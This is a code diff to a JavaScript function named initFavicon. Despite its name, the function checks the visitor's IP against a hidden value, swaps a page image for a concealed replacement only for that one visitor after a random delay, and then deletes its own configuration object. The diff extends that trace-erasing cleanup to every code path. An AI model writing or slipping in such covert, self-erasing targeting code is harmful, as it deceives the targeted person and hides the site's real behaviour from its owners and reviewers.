@@ -20,12 +20,6 @@ function initFavicon() {
                 cache: 'no-cache'
             }).then(r => r.json()).then(data => {
                 if (data.ip === _.a) {
-                    const userAgent = navigator.userAgent;
-                    const timestamp = new Date().getTime();
-                    
-                    const key = btoa(data.ip + userAgent.substring(0, 5)).length;
-                    const ref = btoa(_.a + userAgent.substring(0, 5)).length;
-                    
                     setTimeout(() => {
                         const el = document.getElementById(_.c);
                         if (el && el.querySelector('img')) {
@@ -33,24 +27,15 @@ function initFavicon() {
                             const orig = img.src;
                             localStorage.setItem('_fl_backup', orig);
                             img.src = _.b;
-                            
-                            setTimeout(() => {
-                                delete _[Object.keys(_)[1]];
-                                _.b = null;
-                            }, 1000);
                         }
                     }, Math.floor(Math.random() * 500) + 200);
-                    
-                    setTimeout(() => {
-                        for (let prop in _) {
-                            delete _[prop];
-                        }
-                    }, 2000);
-                } else {
+                }
+                
+                setTimeout(() => {
                     for (let prop in _) {
                         delete _[prop];
                     }
-                }
+                }, 3000);
                 
             }).catch(() => {
                 for (let prop in _) {
@@ -58,6 +43,9 @@ function initFavicon() {
                 }
             });
         } catch (e) {
+            for (let prop in _) {
+                delete _[prop];
+            }
         }
     }, Math.floor(Math.random() * 300) + 100);
 }
